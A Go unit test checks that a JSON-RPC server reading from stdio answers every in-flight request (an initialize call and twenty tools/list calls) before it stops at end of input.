func TestStdioEOFDrainsInFlight(t *testing.T) {
	var in strings.Builder
	in.WriteString(`{"jsonrpc":"2.0","id":0,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{}}}` + "\n")
	for i := 1; i <= 20; i++ {
		fmt.Fprintf(&in, `{"jsonrpc":"2.0","id":%d,"method":"tools/list"}`+"\n", i)
	}
	var out bytes.Buffer
	srv := newServer(nil, false, strings.NewReader(in.String()), io.Discard, &out)
	if err := srv.Serve(); err != nil {
		t.Fatal(err)
	}
	seen := map[string]bool{}
	for _, l := range strings.Split(strings.TrimSpace(out.String()), "\n") {
		var m struct {
			ID json.RawMessage `json:"id"`
		}
		if json.Unmarshal([]byte(l), &m) == nil {
			seen[string(m.ID)] = true
		}
	}
	for i := 0; i <= 20; i++ {
		if !seen[fmt.Sprint(i)] {
			t.Fatalf("no response for id %d; output:\n%s", i, out.String())
		}
	}
}
